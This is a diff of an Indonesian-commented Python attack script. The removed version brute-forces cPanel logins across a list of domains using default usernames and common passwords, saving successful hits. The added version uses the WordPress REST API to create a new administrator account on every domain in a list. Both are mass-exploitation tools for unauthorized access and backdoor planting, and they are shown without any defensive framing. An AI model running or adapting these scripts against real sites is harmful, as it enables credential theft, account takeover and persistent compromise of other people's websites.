@@ -1,48 +1,49 @@
 import sys
 import requests
-import itertools
+from requests.auth import HTTPBasicAuth
 
-# Daftar username dan password
-usernames = ["admin", "root", "cpanel", "user", "webmaster"]
-passwords = ["admin123", "password123", "cpanel2024", "hosting123", "qwerty2024"]
-
-# Fungsi untuk memeriksa login cPanel
-def check_cpanel_login(domain, username, password):
+def add_admin(domain, wp_user, wp_pass, new_user, new_pass, new_email):
     try:
-        url = f"http://{domain}:2082/login"  # Sesuaikan port jika perlu (2083 untuk HTTPS)
-        data = {'user': username, 'pass': password}
+        # URL endpoint REST API untuk menambah pengguna
+        url = f"http://{domain}/wp-json/wp/v2/users"
         
-        response = requests.post(url, data=data, timeout=10)
-        
-        # Logika validasi berdasarkan respon
-        if "redirect" in response.url:
-            print(f"[SUCCESS] {domain} | {username}:{password}")
-            with open('success.txt', 'a') as f:
-                f.write(f"{domain}|{username}|{password}\n")
+        # Data pengguna baru
+        user_data = {
+            "username": new_user,
+            "password": new_pass,
+            "email": new_email,
+            "roles": ["administrator"]
+        }
+
+        # Permintaan POST dengan autentikasi dasar
+        response = requests.post(url, json=user_data, auth=HTTPBasicAuth(wp_user, wp_pass))
+
+        # Validasi hasil
+        if response.status_code == 201:
+            print(f"[SUCCESS] Admin user added to {domain}")
         else:
-            print(f"[FAILED] {domain} | {username}")
+            print(f"[FAILED] Could not add admin to {domain}: {response.text}")
     except Exception as e:
         print(f"[ERROR] {domain} - {str(e)}")
-
-# Membaca daftar domain dari file
-def load_domains(file_path):
-    with open(file_path, 'r') as f:
-        return [line.strip() for line in f.readlines()]
 
 # Fungsi utama
 def main():
     if len(sys.argv) != 2:
-        print("Penggunaan: python file.py <listdomain.txt>")
+        print("Penggunaan: python add_admin.py <listdomain.txt>")
         sys.exit(1)
-    
-    domain_file = sys.argv[1]
-    domains = load_domains(domain_file)
-    
-    # Membuat semua kombinasi username dan password
-    for domain in domains:
-        for username, password in itertools.product(usernames, passwords):
-            check_cpanel_login(domain, username, password)
 
-# Menjalankan fungsi utama
+    # Load domain dari file
+    with open(sys.argv[1], 'r') as file:
+        domains = file.read().splitlines()
+
+    # Input data admin baru
+    new_user = "newadmin"
+    new_pass = "StrongPassword123!"
+    new_email = "newadmin@example.com"
+
+    # Loop setiap domain
+    for domain in domains:
+        add_admin(domain, "existing_admin", "existing_password", new_user, new_pass, new_email)
+
 if __name__ == "__main__":
     main()
